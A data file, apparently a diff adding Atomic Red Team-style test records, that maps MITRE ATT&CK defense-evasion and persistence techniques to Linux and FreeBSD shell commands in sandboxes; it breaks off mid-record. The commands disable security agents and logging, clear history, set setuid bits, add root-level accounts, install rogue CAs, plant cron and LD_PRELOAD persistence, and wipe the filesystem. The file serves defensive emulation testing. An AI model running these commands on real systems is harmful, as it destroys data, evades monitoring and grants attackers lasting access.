+"command": "cp #{payload} /tmp/hello.c && chown root /tmp/hello.c && make /tmp/hello && chown root /tmp/hello && chmod u+s /tmp/hello && /tmp/hello",
+"row_index": 88,
+"sandbox": "1773590768_T1548.001_2_88",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "2",
+"test_name": "Make and modify binary from C source (freebsd)"
+},
+{
+"command": "sudo touch #{file_to_setuid} && sudo chown root #{file_to_setuid} && sudo chmod u+xs #{file_to_setuid}",
+"row_index": 89,
+"sandbox": "1773590889_T1548.001_3_89",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "3",
+"test_name": "Set a SetUID flag on file"
+},
+{
+"command": "touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod u+xs #{file_to_setuid}",
+"row_index": 90,
+"sandbox": "1773591009_T1548.001_4_90",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "4",
+"test_name": "Set a SetUID flag on file (freebsd)"
+},
+{
+"command": "sudo touch #{file_to_setuid} && sudo chown root #{file_to_setuid} && sudo chmod g+xs #{file_to_setuid}",
+"row_index": 91,
+"sandbox": "1773591129_T1548.001_5_91",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "5",
+"test_name": "Set a SetGID flag on file"
+},
+{
+"command": "touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod g+xs #{file_to_setuid}",
+"row_index": 92,
+"sandbox": "1773591249_T1548.001_6_92",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "6",
+"test_name": "Set a SetGID flag on file (freebsd)"
+},
+{
+"command": "cp #{payload} /tmp/cap.c && make /tmp/cap && sudo setcap cap_setuid=ep /tmp/cap && /tmp/cap",
+"row_index": 93,
+"sandbox": "1773591369_T1548.001_7_93",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "7",
+"test_name": "Make and modify capabilities of a binary"
+},
+{
+"command": "touch #{file_to_setcap} && sudo setcap cap_setuid=ep #{file_to_setcap}",
+"row_index": 94,
+"sandbox": "1773591489_T1548.001_8_94",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "8",
+"test_name": "Provide the SetUID capability to a file"
+},
+{
+"command": "find /usr/bin -perm -4000",
+"row_index": 95,
+"sandbox": "1773591609_T1548.001_9_95",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "9",
+"test_name": "Do reconnaissance for files that have the setuid bit set"
+},
+{
+"command": "find /usr/bin -perm -2000",
+"row_index": 96,
+"sandbox": "1773591729_T1548.001_10_96",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "10",
+"test_name": "Do reconnaissance for files that have the setgid bit set"
+},
+{
+"command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name} && if [ -f \"/etc/#{auditd_config_file_name}\" ]; && then sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name} && else sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name} && fi && sed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}",
+"row_index": 97,
+"sandbox": "1773591849_T1562.006_1_97",
+"tactic": "defense-evasion",
+"technique": "T1562.006",
+"test": "1",
+"test_name": "Auditing Configuration Changes on Linux Host"
+},
+{
+"command": "echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}",
+"row_index": 98,
+"sandbox": "1773591969_T1562.006_2_98",
+"tactic": "defense-evasion",
+"technique": "T1562.006",
+"test": "2",
+"test_name": "Auditing Configuration Changes on FreeBSD Host"
+},
+{
+"command": "if [ -f \"/etc/#{syslog_config_file_name}\" ]; && then sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name} && fi && if [ -f \"/etc/#{rsyslog_config_file_name}\" ]; && then sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name} && fi && if [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ]; && then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name} && fi",
+"row_index": 99,
+"sandbox": "1773592090_T1562.006_3_99",
+"tactic": "defense-evasion",
+"technique": "T1562.006",
+"test": "3",
+"test_name": "Logging Configuration Changes on Linux Host"
+},
+{
+"command": "if [ -f \"/etc/#{syslog_config_file_name}\" ]; && then echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name} && fi",
+"row_index": 100,
+"sandbox": "1773592210_T1562.006_4_100",
+"tactic": "defense-evasion",
+"technique": "T1562.006",
+"test": "4",
+"test_name": "Logging Configuration Changes on FreeBSD Host"
+},
+{
+"command": "#{exe_path} & ps && TMP=`ps | grep totally_legit` && if [ -z \"${TMP}\" ] ; then echo \"renamed process NOT FOUND in process list\" && exit 1; fi && exit 0",
+"row_index": 101,
+"sandbox": "1773592330_T1036.004_3_101",
+"tactic": "defense-evasion",
+"technique": "T1036.004",
+"test": "3",
+"test_name": "linux rename /proc/pid/comm using prctl"
+},
+{
+"command": "eval '(while true; do :; done) &' && echo $! > /tmp/evil_pid.txt && random_kernel_pid=$(ps -ef | grep \"\\[.*\\]\" | awk '{print $2}' | shuf -n 1) && sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)",
+"row_index": 102,
+"sandbox": "1773592450_T1036.004_4_102",
+"tactic": "defense-evasion",
+"technique": "T1036.004",
+"test": "4",
+"test_name": "Hiding a malicious process with bind mounts"
+},
+{
+"command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false && Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass} && (Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"}) && Disconnect-VIServer -Confirm:$false",
+"row_index": 103,
+"sandbox": "1773592570_T1562.010_1_103",
+"tactic": "defense-evasion",
+"technique": "T1562.010",
+"test": "1",
+"test_name": "ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI"
+},
+{
+"command": "export HISTCONTROL=ignoreboth && #{evil_command}",
+"row_index": 104,
+"sandbox": "1773592690_T1562.003_1_104",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "1",
+"test_name": "Disable history collection"
+},
+{
+"command": "export HISTSIZE=0 && #{evil_command}",
+"row_index": 105,
+"sandbox": "1773592810_T1562.003_2_105",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "2",
+"test_name": "Disable history collection (freebsd)"
+},
+{
+"command": "1. export HISTCONTROL=ignoreboth && 2. echo export \"HISTCONTROL=ignoreboth\" >> ~/.bash_profile && 3. ls && 4. whoami > recon.txt",
+"row_index": 106,
+"sandbox": "1773592930_T1562.003_3_106",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "3",
+"test_name": "Mac HISTCONTROL"
+},
+{
+"command": "cp $HISTFILE $HISTFILE.OLD && if ((${#HISTFILE[@]})); then echo $HISTFILE; fi && echo \"\" > $HISTFILE && if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi && ls -la $HISTFILE && cat $HISTFILE && history -c && if [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi",
+"row_index": 107,
+"sandbox": "1773593050_T1562.003_4_107",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "4",
+"test_name": "Clear bash history"
+},
+{
+"command": "TEST=$(echo $HISTCONTROL) && if [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi && history -c && ls -la $HISTFILE # \" ls -la $HISTFILE\" && if [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi && if [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi && history -c && ls -la $HISTFILE && ls -la $HISTFILE && ls -la $HISTFILE && if [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi",
+"row_index": 108,
+"sandbox": "1773593170_T1562.003_5_108",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "5",
+"test_name": "Setting the HISTCONTROL environment variable"
+},
+{
+"command": "TEST=$(echo $HISTFILESIZE) && echo $HISTFILESIZE && export HISTFILESIZE=0 && echo \"runnning some commands to populate the history\" && whoami && groups && if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT\";  fi",
+"row_index": 109,
+"sandbox": "1773593291_T1562.003_6_109",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "6",
+"test_name": "Setting the HISTFILESIZE environment variable"
+},
+{
+"command": "echo $HISTSIZE && export HISTSIZE=0 && echo \"runnning some commands to populate the history\" && whoami && groups && if [ $(echo $HISTSIZE) -eq 0 ]; then echo \"\\$HISTSIZE is zero\"; else HIST_LENGTH=$(wc -l $HISTFILE); echo \"\\$HISTSIZE is not zero, history size is $HIST_LENGTH\";  fi",
+"row_index": 110,
+"sandbox": "1773593411_T1562.003_7_110",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "7",
+"test_name": "Setting the HISTSIZE environment variable"
+},
+{
+"command": "TEST=$(echo $HISTFILE) && echo $HISTFILE && export HISTFILE=\"/dev/null\" && echo \"runnning some commands to populate the history\" && whoami && groups && if [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT\";  fi",
+"row_index": 111,
+"sandbox": "1773593531_T1562.003_8_111",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "8",
+"test_name": "Setting the HISTFILE environment variable"
+},
+{
+"command": "echo $HISTFILE && export HISTFILE=\"/dev/null\" && if [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi",
+"row_index": 112,
+"sandbox": "1773593651_T1562.003_9_112",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "9",
+"test_name": "Setting the HISTFILE environment variable (freebsd)"
+},
+{
+"command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi && history -c && ls -la $HISTFILE && ls -la ~/.bash_logout && if [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi && unset HISTIGNORE && if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi && history -c && whoami && groups && if [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi",
+"row_index": 113,
+"sandbox": "1773593771_T1562.003_10_113",
+"tactic": "defense-evasion",
+"technique": "T1562.003",
+"test": "10",
+"test_name": "Setting the HISTIGNORE environment variable"
+},
+{
+"command": "#{flavor_command}",
+"row_index": 114,
+"sandbox": "1773593891_T1562.001_1_114",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "1",
+"test_name": "Disable syslog"
+},
+{
+"command": "service syslogd stop && sysrc syslogd_enable=\"NO\"",
+"row_index": 115,
+"sandbox": "1773594011_T1562.001_2_115",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "2",
+"test_name": "Disable syslog (freebsd)"
+},
+{
+"command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ]; && then && service cbdaemon stop && chkconfig off cbdaemon && else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ]; && systemctl stop cbdaemon && systemctl disable cbdaemon && fi",
+"row_index": 116,
+"sandbox": "1773594131_T1562.001_3_116",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "3",
+"test_name": "Disable Cb Response"
+},
+{
+"command": "setenforce 0",
+"row_index": 117,
+"sandbox": "1773594251_T1562.001_4_117",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "4",
+"test_name": "Disable SELinux"
+},
+{
+"command": "sudo systemctl stop falcon-sensor.service && sudo systemctl disable falcon-sensor.service",
+"row_index": 118,
+"sandbox": "1773594372_T1562.001_5_118",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "5",
+"test_name": "Stop Crowdstrike Falcon on Linux"
+},
+{
+"command": "history -c",
+"row_index": 119,
+"sandbox": "1773594492_T1562.001_39_119",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "39",
+"test_name": "Clear History"
+},
+{
+"command": "set +o history",
+"row_index": 120,
+"sandbox": "1773594612_T1562.001_40_120",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "40",
+"test_name": "Suspend History"
+},
+{
+"command": "echo 1> /proc/sys/kernel/sysrq && echo b> /proc/sysrq-trigger",
+"row_index": 121,
+"sandbox": "1773594732_T1562.001_41_121",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "41",
+"test_name": "Reboot Linux Host via Kernel System Request"
+},
+{
+"command": "free && echo 3 > /proc/sys/vm/drop_caches && free && echo 3> /proc/sys/vm/drop_caches",
+"row_index": 122,
+"sandbox": "1773594852_T1562.001_42_122",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "42",
+"test_name": "Clear Pagging Cache"
+},
+{
+"command": "swapon -a && sleep 2 && swapoff -a && sync",
+"row_index": 123,
+"sandbox": "1773594972_T1562.001_43_123",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "43",
+"test_name": "Disable Memory Swap"
+},
+{
+"command": "sudo mdatp config real-time-protection --value disabled",
+"row_index": 124,
+"sandbox": "1773595092_T1562.001_47_124",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "47",
+"test_name": "Tamper with Defender ATP on Linux/MacOS"
+},
+{
+"command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false && Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass} && Get-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false && Disconnect-VIServer -Confirm:$false",
+"row_index": 125,
+"sandbox": "1773595212_T1562.001_50_125",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "50",
+"test_name": "ESXi - Disable Account Lockout Policy via PowerCLI"
+},
+{
+"command": "sysctl -w kernel.randomize_va_space=0",
+"row_index": 126,
+"sandbox": "1773595332_T1562.001_59_126",
+"tactic": "defense-evasion",
+"technique": "T1562.001",
+"test": "59",
+"test_name": "Disable ASLR Via sysctl parameters - Linux"
+},
+{
+"command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64decode -r\"; else cmd=\"base64 -d\"; fi; && cat /tmp/encoded.dat | $cmd > /tmp/art.sh && chmod +x /tmp/art.sh && /tmp/art.sh",
+"row_index": 127,
+"sandbox": "1773595452_T1027_1_127",
+"tactic": "defense-evasion",
+"technique": "T1027",
+"test": "1",
+"test_name": "Decode base64 Data into Script"
+},
+{
+"command": "cp /bin/sh /tmp/crond; && echo 'sleep 5' | /tmp/crond",
+"row_index": 128,
+"sandbox": "1773595573_T1036.003_2_128",
+"tactic": "defense-evasion",
+"technique": "T1036.003",
+"test": "2",
+"test_name": "Masquerading as FreeBSD or Linux crond process."
+},
+{
+"command": "openssl genrsa -out #{key_filename} 4096 && openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename} && cp #{cert_filename} /etc/pki/ca-trust/source/anchors/ && update-ca-trust",
+"row_index": 129,
+"sandbox": "1773595693_T1553.004_1_129",
+"tactic": "defense-evasion",
+"technique": "T1553.004",
+"test": "1",
+"test_name": "Install root CA on CentOS/RHEL"
+},
+{
+"command": "openssl genrsa -out #{key_filename} 4096 && openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename} && cp #{cert_filename} /usr/local/share/certs/ && certctl rehash",
+"row_index": 130,
+"sandbox": "1773595813_T1553.004_2_130",
+"tactic": "defense-evasion",
+"technique": "T1553.004",
+"test": "2",
+"test_name": "Install root CA on FreeBSD"
+},
+{
+"command": "mv #{cert_filename} /usr/local/share/ca-certificates && sudo update-ca-certificates",
+"row_index": 131,
+"sandbox": "1773595933_T1553.004_3_131",
+"tactic": "defense-evasion",
+"technique": "T1553.004",
+"test": "3",
+"test_name": "Install root CA on Debian/Ubuntu"
+},
+{
+"command": "gcc #{input_file} && ./a.out && clang #{input_file} && ./a.out",
+"row_index": 132,
+"sandbox": "1773596053_T1027.004_3_132",
+"tactic": "defense-evasion",
+"technique": "T1027.004",
+"test": "3",
+"test_name": "C compile"
+},
+{
+"command": "g++ #{input_file} && ./a.out && clang++ #{input_file} && ./a.out",
+"row_index": 133,
+"sandbox": "1773596173_T1027.004_4_133",
+"tactic": "defense-evasion",
+"technique": "T1027.004",
+"test": "4",
+"test_name": "CC compile"
+},
+{
+"command": "go run #{input_file}",
+"row_index": 134,
+"sandbox": "1773596293_T1027.004_5_134",
+"tactic": "defense-evasion",
+"technique": "T1027.004",
+"test": "5",
+"test_name": "Go compile"
+},
+{
+"command": "rm -f #{file_to_delete}",
+"row_index": 135,
+"sandbox": "1773596413_T1070.004_1_135",
+"tactic": "defense-evasion",
+"technique": "T1070.004",
+"test": "1",
+"test_name": "Delete a single file - FreeBSD/Linux/macOS"
+},
+{
+"command": "rm -rf #{folder_to_delete}",
+"row_index": 136,
+"sandbox": "1773596533_T1070.004_2_136",
+"tactic": "defense-evasion",
+"technique": "T1070.004",
+"test": "2",
+"test_name": "Delete an entire folder - FreeBSD/Linux/macOS"
+},
+{
+"command": "shred -u #{file_to_shred}",
+"row_index": 137,
+"sandbox": "1773596653_T1070.004_3_137",
+"tactic": "defense-evasion",
+"technique": "T1070.004",
+"test": "3",
+"test_name": "Overwrite and delete a file with shred"
+},
+{
+"command": "[ \"$(uname)\" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null",
+"row_index": 138,
+"sandbox": "1773596774_T1070.004_8_138",
+"tactic": "defense-evasion",
+"technique": "T1070.004",
+"test": "8",
+"test_name": "Delete Filesystem - Linux"
+},
+{
+"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin",
+"row_index": 139,
+"sandbox": "1773596894_T1027.002_1_139",
+"tactic": "defense-evasion",
+"technique": "T1027.002",
+"test": "1",
+"test_name": "Binary simply packed by UPX (linux)"
+},
+{
+"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin",
+"row_index": 140,
+"sandbox": "1773597014_T1027.002_2_140",
+"tactic": "defense-evasion",
+"technique": "T1027.002",
+"test": "2",
+"test_name": "Binary packed by UPX, with modified headers (linux)"
+},
+{
+"command": "mkdir -p /tmp/atomic-test-T1036.006 && cd /tmp/atomic-test-T1036.006 && mkdir -p 'testdirwithspaceend ' && [ \"$(uname)\" = 'FreeBSD' ] && /bin/echo \"#\\!/bin/sh\" > \"testdirwithspaceend /init \" && echo 'echo \"print(\\\"running T1035.006 with space after filename to masquerade init\\\")\" | python3.9' >> \"testdirwithspaceend /init \" && echo \"exit\" >> \"testdirwithspaceend /init \" || /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null && chmod +x 'testdirwithspaceend /init ' && './testdirwithspaceend /init '",
+"row_index": 141,
+"sandbox": "1773597134_T1036.006_2_141",
+"tactic": "defense-evasion",
+"technique": "T1036.006",
+"test": "2",
+"test_name": "Space After Filename"
+},
+{
+"command": "mkdir /var/tmp/.hidden-directory && echo \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file",
+"row_index": 142,
+"sandbox": "1773597254_T1564.001_1_142",
+"tactic": "defense-evasion",
+"technique": "T1564.001",
+"test": "1",
+"test_name": "Create a hidden file in a hidden directory"
+},
+{
+"command": "password=$(openssl passwd -1 art) && ([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) && su art -c \"whoami; exit\"",
+"row_index": 143,
+"sandbox": "1773597374_T1078.003_8_143",
+"tactic": "defense-evasion",
+"technique": "T1078.003",
+"test": "8",
+"test_name": "Create local account (Linux)"
+},
+{
+"command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art && usermod --lock art && usermod --expiredate \"1\" art && usermod --unlock art && usermod --expiredate \"99999\" art && su -c whoami art",
+"row_index": 144,
+"sandbox": "1773597494_T1078.003_9_144",
+"tactic": "defense-evasion",
+"technique": "T1078.003",
+"test": "9",
+"test_name": "Reactivate a locked/expired account (Linux)"
+},
+{
+"command": "pw useradd art -g wheel -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0 && pw lock art && pw usermod art -e +1d && pw unlock art && pw user mod art -e +99d && su art && whoami && exit",
+"row_index": 145,
+"sandbox": "1773597614_T1078.003_10_145",
+"tactic": "defense-evasion",
+"technique": "T1078.003",
+"test": "10",
+"test_name": "Reactivate a locked/expired account (FreeBSD)"
+},
+{
+"command": "cat /etc/passwd |grep nobody && chsh --shell /bin/bash nobody && usermod --password $(openssl passwd -1 nobody) nobody && su -c \"whoami\" nobody",
+"row_index": 146,
+"sandbox": "1773597734_T1078.003_11_146",
+"tactic": "defense-evasion",
+"technique": "T1078.003",
+"test": "11",
+"test_name": "Login as nobody (Linux)"
+},
+{
+"command": "cat /etc/passwd |grep nobody && pw usermod nobody -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user nobody -h 0 && su nobody && whoami && exit",
+"row_index": 147,
+"sandbox": "1773597854_T1078.003_12_147",
+"tactic": "defense-evasion",
+"technique": "T1078.003",
+"test": "12",
+"test_name": "Login as nobody (freebsd)"
+},
+{
+"command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}",
+"row_index": 148,
+"sandbox": "1773597975_T1556.003_1_148",
+"tactic": "persistence",
+"technique": "T1556.003",
+"test": "1",
+"test_name": "Malicious PAM rule"
+},
+{
+"command": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}",
+"row_index": 149,
+"sandbox": "1773598095_T1556.003_2_149",
+"tactic": "persistence",
+"technique": "T1556.003",
+"test": "2",
+"test_name": "Malicious PAM rule (freebsd)"
+},
+{
+"command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}",
+"row_index": 150,
+"sandbox": "1773598215_T1556.003_3_150",
+"tactic": "persistence",
+"technique": "T1556.003",
+"test": "3",
+"test_name": "Malicious PAM module"
+},
+{
+"command": "crontab -l > /tmp/notevil && echo \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}",
+"row_index": 151,
+"sandbox": "1773598335_T1053.003_1_151",
+"tactic": "persistence",
+"technique": "T1053.003",
+"test": "1",
+"test_name": "Cron - Replace crontab with referenced file"
+},
+{
+"command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name} && echo \"#{command}\" > /etc/cron.hourly/#{cron_script_name} && echo \"#{command}\" > /etc/cron.monthly/#{cron_script_name} && echo \"#{command}\" > /etc/cron.weekly/#{cron_script_name}",
+"row_index": 152,
+"sandbox": "1773598455_T1053.003_2_152",
+"tactic": "persistence",
+"technique": "T1053.003",
+"test": "2",
+"test_name": "Cron - Add script to all cron subfolders"
+},
+{
+"command": "echo \"#{command}\" > /etc/cron.d/#{cron_script_name}",
+"row_index": 153,
+"sandbox": "1773598575_T1053.003_3_153",
+"tactic": "persistence",
+"technique": "T1053.003",
+"test": "3",
+"test_name": "Cron - Add script to /etc/cron.d folder"
+},
+{
+"command": "echo \"#{command}\" >> /var/spool/cron/crontabs/#{cron_script_name}",
+"row_index": 154,
+"sandbox": "1773598695_T1053.003_4_154",
+"tactic": "persistence",
+"technique": "T1053.003",
+"test": "4",
+"test_name": "Cron - Add script to /var/spool/cron/crontabs/ folder"
+},
+{
+"command": "1. Navigate to [chrome://extensions](chrome://extensions) and && tick 'Developer Mode'. && 2. Click 'Load unpacked extension...' and navigate to && [Browser_Extension](../t1176/src/) && 3. Click 'Select'",
+"row_index": 155,
+"sandbox": "1773598815_T1176_1_155",
+"tactic": "persistence",
+"technique": "T1176",
+"test": "1",
+"test_name": "Chrome/Chromium (Developer Mode)"
+},
+{
+"command": "1. Navigate to [about:debugging](about:debugging) and && click \"Load Temporary Add-on\" && 2. Navigate to [manifest.json](./src/manifest.json) && 3. Then click 'Open'",
+"row_index": 156,
+"sandbox": "1773598935_T1176_2_156",
+"tactic": "persistence",
+"technique": "T1176",
+"test": "2",
+"test_name": "Firefox"
+},
+{
+"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'",
+"row_index": 157,
+"sandbox": "1773599056_T1546.005_1_157",
+"tactic": "persistence",
+"technique": "T1546.005",
+"test": "1",
+"test_name": "Trap EXIT"
+},
+{
+"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'",
+"row_index": 158,
+"sandbox": "1773599176_T1546.005_2_158",
+"tactic": "persistence",
+"technique": "T1546.005",
+"test": "2",
+"test_name": "Trap EXIT (freebsd)"
+},
+{
+"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'",
+"row_index": 159,
+"sandbox": "1773599296_T1546.005_3_159",
+"tactic": "persistence",
+"technique": "T1546.005",
+"test": "3",
+"test_name": "Trap SIGINT"
+},
+{
+"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'",
+"row_index": 160,
+"sandbox": "1773599416_T1546.005_4_160",
+"tactic": "persistence",
+"technique": "T1546.005",
+"test": "4",
+"test_name": "Trap SIGINT (freebsd)"
+},
+{
+"command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'",
+"row_index": 161,
+"sandbox": "1773599536_T1574.006_1_161",
+"tactic": "persistence",
+"technique": "T1574.006",
+"test": "1",
+"test_name": "Shared Library Injection via /etc/ld.so.preload"
+},
+{
+"command": "LD_PRELOAD=#{path_to_shared_library} ls",
+"row_index": 162,
+"sandbox": "1773599656_T1574.006_2_162",
+"tactic": "persistence",
+"technique": "T1574.006",
+"test": "2",
+"test_name": "Shared Library Injection via LD_PRELOAD"
+},
+{
+"command": "useradd -M -N -r -s /bin/bash -c evil_account #{username}",
+"row_index": 163,
+"sandbox": "1773599776_T1136.001_1_163",
+"tactic": "persistence",
+"technique": "T1136.001",
+"test": "1",
+"test_name": "Create a user account on a Linux system"
+},
+{
+"command": "pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account",
+"row_index": 164,
+"sandbox": "1773599896_T1136.001_2_164",
+"tactic": "persistence",
+"technique": "T1136.001",
+"test": "2",
+"test_name": "Create a user account on a FreeBSD system"
+},
+{
+"command": "useradd -g 0 -M -d /root -s /bin/bash #{username} && if [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" | sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;",
+"row_index": 165,
+"sandbox": "1773600016_T1136.001_6_165",
+"tactic": "persistence",
+"technique": "T1136.001",
+"test": "6",
+"test_name": "Create a new user in Linux with `root` UID and GID."
+},
+{
+"command": "pw useradd #{username} -g 0 -d /root -s /bin/sh && echo \"#{password}\" | pw usermod #{username} -h 0",
+"row_index": 166,
+"sandbox": "1773600136_T1136.001_7_166",
+"tactic": "persistence",
+"technique": "T1136.001",
+"test": "7",
+"test_name": "Create a new user in FreeBSD with `root` GID."
+},
+{
+"command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;",
+"row_index": 167,
+"sandbox": "1773600256_T1098.004_1_167",
+"tactic": "persistence",
+"technique": "T1098.004",
+"test": "1",
+"test_name": "Modify SSH Authorized Keys"
+},
+{
+"command": "echo \"dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}\" > tempadmin.ldif && echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif && ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif",
+"row_index": 168,
+"sandbox": "1773600377_T1136.002_4_168",
+"tactic": "persistence",
+"technique": "T1136.002",
+"test": "4",
